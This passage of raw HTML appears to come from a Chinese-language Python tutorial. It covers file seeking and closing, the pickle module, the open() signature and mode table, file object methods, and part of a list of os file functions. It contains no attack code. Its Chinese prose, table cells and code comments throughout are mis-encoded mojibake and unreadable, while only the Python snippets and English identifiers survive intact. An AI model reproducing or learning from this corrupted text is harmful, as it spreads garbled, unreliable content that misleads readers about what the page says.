class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># b'5'</span>f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment"># ç§»åŠ¨åˆ°æ–‡ä»¶çš„å€’æ•°ç¬¬ä¸‰å­—èŠ‚</span><span class="token comment"># 13</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># b'd'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="f-close"><a href="#f-close" class="headerlink" title="f.close()"></a>f.close()</h5><p>å½“ä½ å¤„ç†å®Œä¸€ä¸ªæ–‡ä»¶å, è°ƒç”¨ f.close() æ¥å…³é—­æ–‡ä»¶å¹¶é‡Šæ”¾ç³»ç»Ÿçš„èµ„æº</p><h4 id="pickleæ¨¡å—"><a href="#pickleæ¨¡å—" class="headerlink" title="pickleæ¨¡å—"></a>pickleæ¨¡å—</h4><p>pythonçš„pickleæ¨¡å—å®ç°äº†åŸºæœ¬çš„æ•°æ®åºåˆ—å’Œååºåˆ—åŒ–</p><p>åŸºæœ¬æ¥å£ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">pickle<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">,</span>protocol<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœ‰äº† pickle è¿™ä¸ªå¯¹è±¡, å°±èƒ½å¯¹ file ä»¥è¯»å–çš„å½¢å¼æ‰“å¼€:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¤ºä¾‹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token comment"># ä½¿ç”¨pickleæ¨¡å—å°†æ•°æ®å¯¹è±¡ä¿å­˜åˆ°æ–‡ä»¶</span>data1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2.0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token operator">+</span><span class="token number">6j</span><span class="token punctuation">]</span><span class="token punctuation">,</span>         <span class="token string">'b'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'string'</span><span class="token punctuation">,</span> <span class="token string">u'Unicode string'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>         <span class="token string">'c'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">}</span>selfref_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>selfref_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>selfref_list<span class="token punctuation">)</span>output <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'data.pkl'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token comment"># Pickle dictionary using protocol 0.</span>pickle<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>data1<span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token comment"># Pickle the list using the highest protocol available.</span>pickle<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>selfref_list<span class="token punctuation">,</span> output<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>output<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="File-æ–‡ä»¶-æ–¹æ³•"><a href="#File-æ–‡ä»¶-æ–¹æ³•" class="headerlink" title="File(æ–‡ä»¶)æ–¹æ³•"></a>File(æ–‡ä»¶)æ–¹æ³•</h2><h3 id="open-æ–¹æ³•"><a href="#open-æ–¹æ³•" class="headerlink" title="open()æ–¹æ³•"></a>open()æ–¹æ³•</h3><p>open() å‡½æ•°å¸¸ç”¨å½¢å¼</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å®Œæ•´çš„è¯­æ³•æ ¼å¼</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span> buffering<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> closefd<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> opener<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‚æ•°è¯´æ˜</p><ul><li>file: å¿…éœ€ï¼Œæ–‡ä»¶è·¯å¾„ï¼ˆç›¸å¯¹æˆ–è€…ç»å¯¹è·¯å¾„ï¼‰</li><li>mode: å¯é€‰ï¼Œæ–‡ä»¶æ‰“å¼€æ¨¡å¼</li><li>buffering: è®¾ç½®ç¼“å†²</li><li>encoding: ä¸€èˆ¬ä½¿ç”¨utf8</li><li>errors: æŠ¥é”™çº§åˆ«</li><li>newline: åŒºåˆ†æ¢è¡Œç¬¦</li><li>closefd: ä¼ å…¥çš„fileå‚æ•°ç±»å‹</li><li>opener: è®¾ç½®è‡ªå®šä¹‰å¼€å¯å™¨ï¼Œå¼€å¯å™¨çš„è¿”å›å€¼å¿…é¡»æ˜¯ä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ã€‚</li></ul><p>mode å‚æ•°</p><table><thead><tr><th align="left">æ¨¡å¼</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">t</td><td align="left">æ–‡æœ¬æ¨¡å¼ (é»˜è®¤)ã€‚</td></tr><tr><td align="left">x</td><td align="left">å†™æ¨¡å¼ï¼Œæ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™ä¼šæŠ¥é”™ã€‚</td></tr><tr><td align="left">b</td><td align="left">äºŒè¿›åˆ¶æ¨¡å¼ã€‚</td></tr><tr><td align="left">+</td><td align="left">æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œæ›´æ–°(å¯è¯»å¯å†™)ã€‚</td></tr><tr><td align="left">U</td><td align="left">é€šç”¨æ¢è¡Œæ¨¡å¼ï¼ˆ<strong>Python 3 ä¸æ”¯æŒ</strong>ï¼‰ã€‚</td></tr><tr><td align="left">r</td><td align="left">ä»¥åªè¯»æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚æ–‡ä»¶çš„æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚è¿™æ˜¯é»˜è®¤æ¨¡å¼ã€‚</td></tr><tr><td align="left">rb</td><td align="left">ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºåªè¯»ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚è¿™æ˜¯é»˜è®¤æ¨¡å¼ã€‚ä¸€èˆ¬ç”¨äºéæ–‡æœ¬æ–‡ä»¶å¦‚å›¾ç‰‡ç­‰ã€‚</td></tr><tr><td align="left">r+</td><td align="left">æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚</td></tr><tr><td align="left">rb+</td><td align="left">ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚ä¸€èˆ¬ç”¨äºéæ–‡æœ¬æ–‡ä»¶å¦‚å›¾ç‰‡ç­‰ã€‚</td></tr><tr><td align="left">w</td><td align="left">æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶åªç”¨äºå†™å…¥ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚</td></tr><tr><td align="left">wb</td><td align="left">ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶åªç”¨äºå†™å…¥ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚ä¸€èˆ¬ç”¨äºéæ–‡æœ¬æ–‡ä»¶å¦‚å›¾ç‰‡ç­‰ã€‚</td></tr><tr><td align="left">w+</td><td align="left">æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚</td></tr><tr><td align="left">wb+</td><td align="left">ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚ä¸€èˆ¬ç”¨äºéæ–‡æœ¬æ–‡ä»¶å¦‚å›¾ç‰‡ç­‰ã€‚</td></tr><tr><td align="left">a</td><td align="left">æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¿½åŠ ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ–°çš„å†…å®¹å°†ä¼šè¢«å†™å…¥åˆ°å·²æœ‰å†…å®¹ä¹‹åã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶è¿›è¡Œå†™å…¥ã€‚</td></tr><tr><td align="left">ab</td><td align="left">ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¿½åŠ ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ–°çš„å†…å®¹å°†ä¼šè¢«å†™å…¥åˆ°å·²æœ‰å†…å®¹ä¹‹åã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶è¿›è¡Œå†™å…¥ã€‚</td></tr><tr><td align="left">a+</td><td align="left">æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚æ–‡ä»¶æ‰“å¼€æ—¶ä¼šæ˜¯è¿½åŠ æ¨¡å¼ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ç”¨äºè¯»å†™ã€‚</td></tr><tr><td align="left">ab+</td><td align="left">ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¿½åŠ ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ç”¨äºè¯»å†™ã€‚</td></tr></tbody></table><p>é»˜è®¤ä¸ºæ–‡æœ¬æ¨¡å¼ï¼Œå¦‚æœè¦ä»¥äºŒè¿›åˆ¶æ¨¡å¼æ‰“å¼€ï¼ŒåŠ ä¸Š <strong>b</strong> </p><h3 id="file-å¯¹è±¡"><a href="#file-å¯¹è±¡" class="headerlink" title="file å¯¹è±¡"></a>file å¯¹è±¡</h3><p>file å¯¹è±¡ä½¿ç”¨ open å‡½æ•°æ¥åˆ›å»º</p><p>file å¯¹è±¡å¸¸ç”¨çš„å‡½æ•°</p><table><thead><tr><th align="left">åºå·</th><th align="left">æ–¹æ³•åŠæè¿°</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-close.html">file.close()</a>å…³é—­æ–‡ä»¶ã€‚å…³é—­åæ–‡ä»¶ä¸èƒ½å†è¿›è¡Œè¯»å†™æ“ä½œã€‚</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-flush.html">file.flush()</a>åˆ·æ–°æ–‡ä»¶å†…éƒ¨ç¼“å†²ï¼Œç›´æ¥æŠŠå†…éƒ¨ç¼“å†²åŒºçš„æ•°æ®ç«‹åˆ»å†™å…¥æ–‡ä»¶, è€Œä¸æ˜¯è¢«åŠ¨çš„ç­‰å¾…è¾“å‡ºç¼“å†²åŒºå†™å…¥ã€‚</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-fileno.html">file.fileno()</a>è¿”å›ä¸€ä¸ªæ•´å‹çš„æ–‡ä»¶æè¿°ç¬¦(file descriptor FD æ•´å‹), å¯ä»¥ç”¨åœ¨å¦‚osæ¨¡å—çš„readæ–¹æ³•ç­‰ä¸€äº›åº•å±‚æ“ä½œä¸Šã€‚</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-isatty.html">file.isatty()</a>å¦‚æœæ–‡ä»¶è¿æ¥åˆ°ä¸€ä¸ªç»ˆç«¯è®¾å¤‡è¿”å› Trueï¼Œå¦åˆ™è¿”å› Falseã€‚</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-next.html">file.next()</a><strong>Python 3 ä¸­çš„ File å¯¹è±¡ä¸æ”¯æŒ next() æ–¹æ³•ã€‚</strong>è¿”å›æ–‡ä»¶ä¸‹ä¸€è¡Œã€‚</td></tr><tr><td align="left">6</td><td align="left">[file.read(<a href="https://www.runoob.com/python3/python3-file-read.html">size])</a>ä»æ–‡ä»¶è¯»å–æŒ‡å®šçš„å­—èŠ‚æ•°ï¼Œå¦‚æœæœªç»™å®šæˆ–ä¸ºè´Ÿåˆ™è¯»å–æ‰€æœ‰ã€‚</td></tr><tr><td align="left">7</td><td align="left">[file.readline(<a href="https://www.runoob.com/python3/python3-file-readline.html">size])</a>è¯»å–æ•´è¡Œï¼ŒåŒ…æ‹¬ â€œ\nâ€ å­—ç¬¦ã€‚</td></tr><tr><td align="left">8</td><td align="left">[file.readlines(<a href="https://www.runoob.com/python3/python3-file-readlines.html">sizeint])</a>è¯»å–æ‰€æœ‰è¡Œå¹¶è¿”å›åˆ—è¡¨ï¼Œè‹¥ç»™å®šsizeint&gt;0ï¼Œè¿”å›æ€»å’Œå¤§çº¦ä¸ºsizeintå­—èŠ‚çš„è¡Œ, å®é™…è¯»å–å€¼å¯èƒ½æ¯” sizeint è¾ƒå¤§, å› ä¸ºéœ€è¦å¡«å……ç¼“å†²åŒºã€‚</td></tr><tr><td align="left">9</td><td align="left">[file.seek(offset<a href="https://www.runoob.com/python3/python3-file-seek.html">, whence])</a>ç§»åŠ¨æ–‡ä»¶è¯»å–æŒ‡é’ˆåˆ°æŒ‡å®šä½ç½®</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-tell.html">file.tell()</a>è¿”å›æ–‡ä»¶å½“å‰ä½ç½®ã€‚</td></tr><tr><td align="left">11</td><td align="left">[file.truncate(<a href="https://www.runoob.com/python3/python3-file-truncate.html">size])</a>ä»æ–‡ä»¶çš„é¦–è¡Œé¦–å­—ç¬¦å¼€å§‹æˆªæ–­ï¼Œæˆªæ–­æ–‡ä»¶ä¸º size ä¸ªå­—ç¬¦ï¼Œæ—  size è¡¨ç¤ºä»å½“å‰ä½ç½®æˆªæ–­ï¼›æˆªæ–­ä¹‹ååé¢çš„æ‰€æœ‰å­—ç¬¦è¢«åˆ é™¤ï¼Œå…¶ä¸­ windows ç³»ç»Ÿä¸‹çš„æ¢è¡Œä»£è¡¨2ä¸ªå­—ç¬¦å¤§å°ã€‚</td></tr><tr><td align="left">12</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-write.html">file.write(str)</a>å°†å­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ï¼Œè¿”å›çš„æ˜¯å†™å…¥çš„å­—ç¬¦é•¿åº¦ã€‚</td></tr><tr><td align="left">13</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-writelines.html">file.writelines(sequence)</a>å‘æ–‡ä»¶å†™å…¥ä¸€ä¸ªåºåˆ—å­—ç¬¦ä¸²åˆ—è¡¨ï¼Œå¦‚æœéœ€è¦æ¢è¡Œåˆ™è¦è‡ªå·±åŠ å…¥æ¯è¡Œçš„æ¢è¡Œç¬¦ã€‚</td></tr></tbody></table><h2 id="OS-æ–‡ä»¶-ç›®å½•æ–¹æ³•"><a href="#OS-æ–‡ä»¶-ç›®å½•æ–¹æ³•" class="headerlink" title="OS æ–‡ä»¶/ç›®å½•æ–¹æ³•"></a>OS æ–‡ä»¶/ç›®å½•æ–¹æ³•</h2><p>ä¸€éƒ¨åˆ†å‡½æ•°åªèƒ½åœ¨linuxä¸­ä½¿ç”¨</p><table><thead><tr><th align="left">åºå·</th><th align="left">æ–¹æ³•åŠæè¿°</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-access.html">os.access(path, mode)</a> æ£€éªŒæƒé™æ¨¡å¼</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-chdir.html">os.chdir(path)</a> æ”¹å˜å½“å‰å·¥ä½œç›®å½•</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-chflags.html">os.chflags(path, flags)</a> è®¾ç½®è·¯å¾„çš„æ ‡è®°ä¸ºæ•°å­—æ ‡è®°ã€‚</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-chmod.html">os.chmod(path, mode)</a> æ›´æ”¹æƒé™</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-chown.html">os.chown(path, uid, gid)</a> æ›´æ”¹æ–‡ä»¶æ‰€æœ‰è€…</td></tr><tr><td align="left">6</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-chroot.html">os.chroot(path)</a> æ”¹å˜å½“å‰è¿›ç¨‹çš„æ ¹ç›®å½•</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-close.html">os.close(fd)</a> å…³é—­æ–‡ä»¶æè¿°ç¬¦ fd</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-closerange.html">os.closerange(fd_low, fd_high)</a> å…³é—­æ‰€æœ‰æ–‡ä»¶æè¿°ç¬¦ï¼Œä» fd_low (åŒ…å«) åˆ° fd_high (ä¸åŒ…å«), é”™è¯¯ä¼šå¿½ç•¥</td></tr><tr><td align="left">9</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-dup.html">os.dup(fd)</a> å¤åˆ¶æ–‡ä»¶æè¿°ç¬¦ fd</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-dup2.html">os.dup2(fd, fd2)</a> å°†ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ fd å¤åˆ¶åˆ°å¦ä¸€ä¸ª fd2</td></tr><tr><td align="left">11</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-fchdir.html">os.fchdir(fd)</a> é€šè¿‡æ–‡ä»¶æè¿°ç¬¦æ”¹å˜å½“å‰å·¥ä½œç›®å½•</td></tr><tr><td align="left">12</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-fchmod.html">os.fchmod(fd, mode)</a> æ”¹å˜ä¸€ä¸ªæ–‡ä»¶çš„è®¿é—®æƒé™ï¼Œè¯¥æ–‡ä»¶ç”±å‚æ•°fdæŒ‡å®šï¼Œå‚æ•°modeæ˜¯Unixä¸‹çš„æ–‡ä»¶è®¿é—®æƒé™ã€‚</td></tr><tr><td align="left">13</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-fchown.html">os.fchown(fd, uid, gid)</a> ä¿®æ”¹ä¸€ä¸ªæ–‡ä»¶çš„æ‰€æœ‰æƒï¼Œè¿™ä¸ªå‡½æ•°ä¿®æ”¹ä¸€ä¸ªæ–‡ä»¶çš„ç”¨æˆ·IDå’Œç”¨æˆ·ç»„IDï¼Œè¯¥æ–‡ä»¶ç”±æ–‡ä»¶æè¿°ç¬¦fdæŒ‡å®šã€‚</td></tr><tr><td align="left">14</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-fdatasync.html">os.fdatasync(fd)</a> å¼ºåˆ¶å°†æ–‡ä»¶å†™å…¥ç£ç›˜ï¼Œè¯¥æ–‡ä»¶ç”±æ–‡ä»¶æè¿°ç¬¦fdæŒ‡å®šï¼Œä½†æ˜¯ä¸å¼ºåˆ¶æ›´æ–°æ–‡ä»¶çš„çŠ¶æ€ä¿¡æ¯ã€‚</td></tr><tr><td align="left">15</td><td align="left">[os.fdopen(fd<a href="https://www.runoob.com/python3/python3-os-fdopen.html">, mode[, bufsize]])</a> é€šè¿‡æ–‡ä»¶æè¿°ç¬¦ fd åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¯¹è±¡ï¼Œå¹¶è¿”å›è¿™ä¸ªæ–‡ä»¶å¯¹è±¡</td></tr><tr><td align="left">16</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-fpathconf.html">os.fpathconf(fd, name)</a> è¿”å›ä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶çš„ç³»ç»Ÿé…ç½®ä¿¡æ¯ã€‚nameä¸ºæ£€ç´¢çš„ç³»ç»Ÿé…ç½®çš„å€¼ï¼Œå®ƒä¹Ÿè®¸æ˜¯ä¸€ä¸ªå®šä¹‰ç³»ç»Ÿå€¼çš„å­—ç¬¦ä¸²ï¼Œè¿™äº›åå­—åœ¨å¾ˆå¤šæ ‡å‡†ä¸­æŒ‡å®šï¼ˆPOSIX.1, Unix 95, Unix 98, å’Œå…¶å®ƒï¼‰ã€‚</td></tr><tr><td align="left">17</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-fstat.html">os.fstat(fd)</a> è¿”å›æ–‡ä»¶æè¿°ç¬¦fdçš„çŠ¶æ€ï¼Œåƒstat()ã€‚</td></tr><tr><td align="left">18</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-fstatvfs.html">os.fstatvfs(fd)</a> è¿”å›åŒ…å«æ–‡ä»¶æè¿°ç¬¦fdçš„æ–‡ä»¶çš„æ–‡ä»¶ç³»ç»Ÿçš„ä¿¡æ¯ï¼ŒPython 3.3 ç›¸ç­‰äº statvfs()ã€‚</td></tr><tr><td align="left">19</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-fsync.html">os.fsync(fd)</a> å¼ºåˆ¶å°†æ–‡ä»¶æè¿°ç¬¦ä¸ºfdçš„æ–‡ä»¶å†™å…¥ç¡¬ç›˜ã€‚</td></tr><tr><td align="left">20</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-ftruncate.html">os.ftruncate(fd, length)</a> è£å‰ªæ–‡ä»¶æè¿°ç¬¦fdå¯¹åº”çš„æ–‡ä»¶, æ‰€ä»¥å®ƒæœ€å¤§ä¸èƒ½è¶…è¿‡æ–‡ä»¶å¤§å°ã€‚</td></tr><tr><td align="left">21</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-getcwd.html">os.getcwd()</a> è¿”å›å½“å‰å·¥ä½œç›®å½•</td></tr><tr><td align="left">22</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-getcwdb.html">os.getcwdb()</a> è¿”å›ä¸€ä¸ªå½“å‰å·¥ä½œç›®å½•çš„Unicodeå¯¹è±¡</td></tr><tr><td align="left">23</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-isatty.html">os.isatty(fd)</a> å¦‚æœæ–‡ä»¶æè¿°ç¬¦fdæ˜¯æ‰“å¼€çš„ï¼ŒåŒæ—¶ä¸tty(-like)è®¾å¤‡ç›¸è¿ï¼Œåˆ™è¿”å›true, å¦åˆ™Falseã€‚</td></tr><tr><td align="left">24</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-lchflags.html">os.lchflags(path, flags)</a> è®¾ç½®è·¯å¾„çš„æ ‡è®°ä¸ºæ•°å­—æ ‡è®°ï¼Œç±»ä¼¼ chflags()ï¼Œä½†æ˜¯æ²¡æœ‰è½¯é“¾æ¥</td></tr><tr><td align="left">25</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-lchmod.html">os.lchmod(path, mode)</a> ä¿®æ”¹è¿æ¥æ–‡ä»¶æƒé™</td></tr><tr><td align="left">26</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-lchown.html">os.lchown(path, uid, gid)</a> æ›´æ”¹æ–‡ä»¶æ‰€æœ‰è€…ï¼Œç±»ä¼¼ chownï¼Œä½†æ˜¯ä¸è¿½è¸ªé“¾æ¥ã€‚</td></tr><tr><td align="left">27</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-link.html">os.link(src, dst)</a> åˆ›å»ºç¡¬é“¾æ¥ï¼Œåä¸ºå‚æ•° dstï¼ŒæŒ‡å‘å‚æ•° src</td></tr><tr><td align="left">28</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-listdir.html">os.listdir(path)</a> è¿”å›pathæŒ‡å®šçš„æ–‡ä»¶å¤¹åŒ…å«çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„åå­—çš„åˆ—è¡¨ã€‚</td></tr><tr><td align="left">29</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-lseek.html">os.lseek(fd, pos, how)</a> è®¾ç½®æ–‡ä»¶æè¿°ç¬¦ fdå½“å‰ä½ç½®ä¸ºpos, howæ–¹å¼ä¿®æ”¹: SEEK_SET æˆ–è€… 0 è®¾ç½®ä»æ–‡ä»¶å¼€å§‹çš„è®¡ç®—çš„pos; SEEK_CURæˆ–è€… 1 åˆ™ä»å½“å‰ä½ç½®è®¡ç®—; os.SEEK_ENDæˆ–è€…2åˆ™ä»æ–‡ä»¶å°¾éƒ¨å¼€å§‹. åœ¨unixï¼ŒWindowsä¸­æœ‰æ•ˆ</td></tr><tr><td align="left">30</td><td align="left"><a href="https://www.runoob.com/python3/python3-os-lstat.html">os.lstat(path)</a> 